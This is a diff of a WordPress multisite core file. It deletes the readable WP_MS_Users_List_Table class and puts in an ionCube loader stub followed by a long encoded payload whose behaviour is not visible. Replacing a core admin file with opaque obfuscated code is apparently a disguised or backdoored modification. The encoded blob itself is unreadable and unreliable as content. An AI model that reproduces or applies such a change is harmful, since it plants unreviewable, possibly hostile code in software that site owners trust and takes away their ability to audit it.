@@ -1,457 +1,249 @@
-<?php
-/**
- * List Table API: WP_MS_Users_List_Table class
- *
- * @package WordPress
- * @subpackage Administration
- * @since 3.1.0
- */
-
-/**
- * Core class used to implement displaying users in a list table for the network admin.
- *
- * @since 3.1.0
- * @access private
- *
- * @see WP_List_Table
- */
-class WP_MS_Users_List_Table extends WP_List_Table {
-	/**
-	 *
-	 * @return bool
-	 */
-	public function ajax_user_can() {
-		return current_user_can( 'manage_network_users' );
-	}
-
-	/**
-	 *
-	 * @global string $usersearch
-	 * @global string $role
-	 * @global wpdb   $wpdb
-	 * @global string $mode
-	 */
-	public function prepare_items() {
-		global $usersearch, $role, $wpdb, $mode;
-
-		$usersearch = isset( $_REQUEST['s'] ) ? wp_unslash( trim( $_REQUEST['s'] ) ) : '';
-
-		$users_per_page = $this->get_items_per_page( 'users_network_per_page' );
-
-		$role = isset( $_REQUEST['role'] ) ? $_REQUEST['role'] : '';
-
-		$paged = $this->get_pagenum();
-
-		$args = array(
-			'number' => $users_per_page,
-			'offset' => ( $paged-1 ) * $users_per_page,
-			'search' => $usersearch,
-			'blog_id' => 0,
-			'fields' => 'all_with_meta'
-		);
-
-		if ( wp_is_large_network( 'users' ) ) {
-			$args['search'] = ltrim( $args['search'], '*' );
-		} else if ( '' !== $args['search'] ) {
-			$args['search'] = trim( $args['search'], '*' );
-			$args['search'] = '*' . $args['search'] . '*';
-		}
-
-		if ( $role === 'super' ) {
-			$logins = implode( "', '", get_super_admins() );
-			$args['include'] = $wpdb->get_col( "SELECT ID FROM $wpdb->users WHERE user_login IN ('$logins')" );
-		}
-
-		/*
-		 * If the network is large and a search is not being performed,
-		 * show only the latest users with no paging in order to avoid
-		 * expensive count queries.
-		 */
-		if ( !$usersearch && wp_is_large_network( 'users' ) ) {
-			if ( !isset($_REQUEST['orderby']) )
-				$_GET['orderby'] = $_REQUEST['orderby'] = 'id';
-			if ( !isset($_REQUEST['order']) )
-				$_GET['order'] = $_REQUEST['order'] = 'DESC';
-			$args['count_total'] = false;
-		}
-
-		if ( isset( $_REQUEST['orderby'] ) )
-			$args['orderby'] = $_REQUEST['orderby'];
-
-		if ( isset( $_REQUEST['order'] ) )
-			$args['order'] = $_REQUEST['order'];
-
-		if ( ! empty( $_REQUEST['mode'] ) ) {
-			$mode = $_REQUEST['mode'] === 'excerpt' ? 'excerpt' : 'list';
-			set_user_setting( 'network_users_list_mode', $mode );
-		} else {
-			$mode = get_user_setting( 'network_users_list_mode', 'list' );
-		}
-
-		/** This filter is documented in wp-admin/includes/class-wp-users-list-table.php */
-		$args = apply_filters( 'users_list_table_query_args', $args );
-
-		// Query the user IDs for this page
-		$wp_user_search = new WP_User_Query( $args );
-
-		$this->items = $wp_user_search->get_results();
-
-		$this->set_pagination_args( array(
-			'total_items' => $wp_user_search->get_total(),
-			'per_page' => $users_per_page,
-		) );
-	}
-
-	/**
-	 *
-	 * @return array
-	 */
-	protected function get_bulk_actions() {
-		$actions = array();
-		if ( current_user_can( 'delete_users' ) )
-			$actions['delete'] = __( 'Delete' );
-		$actions['spam'] = _x( 'Mark as Spam', 'user' );
-		$actions['notspam'] = _x( 'Not Spam', 'user' );
-
-		return $actions;
-	}
-
-	/**
-	 */
-	public function no_items() {
-		_e( 'No users found.' );
-	}
-
-	/**
-	 *
-	 * @global string $role
-	 * @return array
-	 */
-	protected function get_views() {
-		global $role;
-
-		$total_users = get_user_count();
-		$super_admins = get_super_admins();
-		$total_admins = count( $super_admins );
-
-		$current_link_attributes = $role !== 'super' ? ' class="current" aria-current="page"' : '';
-		$role_links = array();
-		$role_links['all'] = "<a href='" . network_admin_url( 'users.php' ) . "'$current_link_attributes>" . sprintf( _nx( 'All <span class="count">(%s)</span>', 'All <span class="count">(%s)</span>', $total_users, 'users' ), number_format_i18n( $total_users ) ) . '</a>';
-		$current_link_attributes = $role === 'super' ? ' class="current" aria-current="page"' : '';
-		$role_links['super'] = "<a href='" . network_admin_url( 'users.php?role=super' ) . "'$current_link_attributes>" . sprintf( _n( 'Super Admin <span class="count">(%s)</span>', 'Super Admins <span class="count">(%s)</span>', $total_admins ), number_format_i18n( $total_admins ) ) . '</a>';
-
-		return $role_links;
-	}
-
-	/**
-	 * @global string $mode List table view mode.
-	 *
-	 * @param string $which
-	 */
-	protected function pagination( $which ) {
-		global $mode;
-
-		parent::pagination ( $which );
-
-		if ( 'top' === $which ) {
-			$this->view_switcher( $mode );
-		}
-	}
-
-	/**
-	 *
-	 * @return array
-	 */
-	public function get_columns() {
-		$users_columns = array(
-			'cb'         => '<input type="checkbox" />',
-			'username'   => __( 'Username' ),
-			'name'       => __( 'Name' ),
-			'email'      => __( 'Email' ),
-			'registered' => _x( 'Registered', 'user' ),
-			'blogs'      => __( 'Sites' )
-		);
-		/**
-		 * Filters the columns displayed in the Network Admin Users list table.
-		 *
-		 * @since MU (3.0.0)
-		 *
-		 * @param array $users_columns An array of user columns. Default 'cb', 'username',
-		 *                             'name', 'email', 'registered', 'blogs'.
-		 */
-		return apply_filters( 'wpmu_users_columns', $users_columns );
-	}
-
-	/**
-	 *
-	 * @return array
-	 */
-	protected function get_sortable_columns() {
-		return array(
-			'username'   => 'login',
-			'name'       => 'name',
-			'email'      => 'email',
-			'registered' => 'id',
-		);
-	}
-
-	/**
-	 * Handles the checkbox column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_cb( $user ) {
-		if ( is_super_admin( $user->ID ) ) {
-			return;
-		}
-		?>
-		<label class="screen-reader-text" for="blog_<?php echo $user->ID; ?>"><?php echo sprintf( __( 'Select %s' ), $user->user_login ); ?></label>
-		<input type="checkbox" id="blog_<?php echo $user->ID ?>" name="allusers[]" value="<?php echo esc_attr( $user->ID ) ?>" />
-		<?php
-	}
-
-	/**
-	 * Handles the ID column output.
-	 *
-	 * @since 4.4.0
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_id( $user ) {
-		echo $user->ID;
-	}
-
-	/**
-	 * Handles the username column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_username( $user ) {
-		$super_admins = get_super_admins();
-		$avatar	= get_avatar( $user->user_email, 32 );
-		$edit_link = esc_url( add_query_arg( 'wp_http_referer', urlencode( wp_unslash( $_SERVER['REQUEST_URI'] ) ), get_edit_user_link( $user->ID ) ) );
-
-		echo $avatar;
-
-		?><strong><a href="<?php echo $edit_link; ?>" class="edit"><?php echo $user->user_login; ?></a><?php
-		if ( in_array( $user->user_login, $super_admins ) ) {
-			echo ' &mdash; ' . __( 'Super Admin' );
-		}
-		?></strong>
-	<?php
-	}
-
-	/**
-	 * Handles the name column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_name( $user ) {
-		if ( $user->first_name && $user->last_name ) {
-			echo "$user->first_name $user->last_name";
-		} elseif ( $user->first_name ) {
-			echo $user->first_name;
-		} elseif ( $user->last_name ) {
-			echo $user->last_name;
-		} else {
-			echo '<span aria-hidden="true">&#8212;</span><span class="screen-reader-text">' . _x( 'Unknown', 'name' ) . '</span>';
-		}
-	}
-
-	/**
-	 * Handles the email column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_email( $user ) {
-		echo "<a href='" . esc_url( "mailto:$user->user_email" ) . "'>$user->user_email</a>";
-	}
-
-	/**
-	 * Handles the registered date column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @global string $mode List table view mode.
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_registered( $user ) {
-		global $mode;
-		if ( 'list' === $mode ) {
-			$date = __( 'Y/m/d' );
-		} else {
-			$date = __( 'Y/m/d g:i:s a' );
-		}
-		echo mysql2date( $date, $user->user_registered );
-	}
-
-	/**
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user
-	 * @param string  $classes
-	 * @param string  $data
-	 * @param string  $primary
-	 */
-	protected function _column_blogs( $user, $classes, $data, $primary ) {
-		echo '<td class="', $classes, ' has-row-actions" ', $data, '>';
-		echo $this->column_blogs( $user );
-		echo $this->handle_row_actions( $user, 'blogs', $primary );
-		echo '</td>';
-	}
-
-	/**
-	 * Handles the sites column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user The current WP_User object.
-	 */
-	public function column_blogs( $user ) {
-		$blogs = get_blogs_of_user( $user->ID, true );
-		if ( ! is_array( $blogs ) ) {
-			return;
-		}
-
-		foreach ( $blogs as $val ) {
-			if ( ! can_edit_network( $val->site_id ) ) {
-				continue;
-			}
-
-			$path	= ( $val->path === '/' ) ? '' : $val->path;
-			echo '<span class="site-' . $val->site_id . '" >';
-			echo '<a href="'. esc_url( network_admin_url( 'site-info.php?id=' . $val->userblog_id ) ) .'">' . str_replace( '.' . get_network()->domain, '', $val->domain . $path ) . '</a>';
-			echo ' <small class="row-actions">';
-			$actions = array();
-			$actions['edit'] = '<a href="'. esc_url( network_admin_url( 'site-info.php?id=' . $val->userblog_id ) ) .'">' . __( 'Edit' ) . '</a>';
-
-			$class = '';
-			if ( $val->spam == 1 ) {
-				$class .= 'site-spammed ';
-			}
-			if ( $val->mature == 1 ) {
-				$class .= 'site-mature ';
-			}
-			if ( $val->deleted == 1 ) {
-				$class .= 'site-deleted ';
-			}
-			if ( $val->archived == 1 ) {
-				$class .= 'site-archived ';
-			}
-
-			$actions['view'] = '<a class="' . $class . '" href="' . esc_url( get_home_url( $val->userblog_id ) ) . '">' . __( 'View' ) . '</a>';
-
-			/**
-			 * Filters the action links displayed next the sites a user belongs to
-			 * in the Network Admin Users list table.
-			 *
-			 * @since 3.1.0
-			 *
-			 * @param array $actions     An array of action links to be displayed.
-			 *                           Default 'Edit', 'View'.
-			 * @param int   $userblog_id The site ID.
-			 */
-			$actions = apply_filters( 'ms_user_list_site_actions', $actions, $val->userblog_id );
-
-			$i=0;
-			$action_count = count( $actions );
-			foreach ( $actions as $action => $link ) {
-				++$i;
-				$sep = ( $i == $action_count ) ? '' : ' | ';
-				echo "<span class='$action'>$link$sep</span>";
-			}
-			echo '</small></span><br/>';
-		}
-	}
-
-	/**
-	 * Handles the default column output.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param WP_User $user       The current WP_User object.
-	 * @param string $column_name The current column name.
-	 */
-	public function column_default( $user, $column_name ) {
-		/** This filter is documented in wp-admin/includes/class-wp-users-list-table.php */
-		echo apply_filters( 'manage_users_custom_column', '', $column_name, $user->ID );
-	}
-
-	public function display_rows() {
-		foreach ( $this->items as $user ) {
-			$class = '';
-
-			$status_list = array( 'spam' => 'site-spammed', 'deleted' => 'site-deleted' );
-
-			foreach ( $status_list as $status => $col ) {
-				if ( $user->$status ) {
-					$class .= " $col";
-				}
-			}
-
-			?>
-			<tr class="<?php echo trim( $class ); ?>">
-				<?php $this->single_row_columns( $user ); ?>
-			</tr>
-			<?php
-		}
-	}
-
-	/**
-	 * Gets the name of the default primary column.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @return string Name of the default primary column, in this case, 'username'.
-	 */
-	protected function get_default_primary_column_name() {
-		return 'username';
-	}
-
-	/**
-	 * Generates and displays row action links.
-	 *
-	 * @since 4.3.0
-	 *
-	 * @param object $user        User being acted upon.
-	 * @param string $column_name Current column name.
-	 * @param string $primary     Primary column name.
-	 * @return string Row actions output for users in Multisite.
-	 */
-	protected function handle_row_actions( $user, $column_name, $primary ) {
-		if ( $primary !== $column_name ) {
-			return '';
-		}
-
-		$super_admins = get_super_admins();
-		$edit_link = esc_url( add_query_arg( 'wp_http_referer', urlencode( wp_unslash( $_SERVER['REQUEST_URI'] ) ), get_edit_user_link( $user->ID ) ) );
-
-		$actions = array();
-		$actions['edit'] = '<a href="' . $edit_link . '">' . __( 'Edit' ) . '</a>';
-
-		if ( current_user_can( 'delete_user', $user->ID ) && ! in_array( $user->user_login, $super_admins ) ) {
-			$actions['delete'] = '<a href="' . $delete = esc_url( network_admin_url( add_query_arg( '_wp_http_referer', urlencode( wp_unslash( $_SERVER['REQUEST_URI'] ) ), wp_nonce_url( 'users.php', 'deleteuser' ) . '&amp;action=deleteuser&amp;id=' . $user->ID ) ) ) . '" class="delete">' . __( 'Delete' ) . '</a>';
-		}
-
-		/**
-		 * Filters the action links displayed under each user in the Network Admin Users list table.
-		 *
-		 * @since 3.2.0
-		 *
-		 * @param array   $actions An array of action links to be displayed.
-		 *                         Default 'Edit', 'Delete'.
-		 * @param WP_User $user    WP_User object.
-		 */
-		$actions = apply_filters( 'ms_user_row_actions', $actions, $user );
-		return $this->row_actions( $actions );
-	}
-}
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
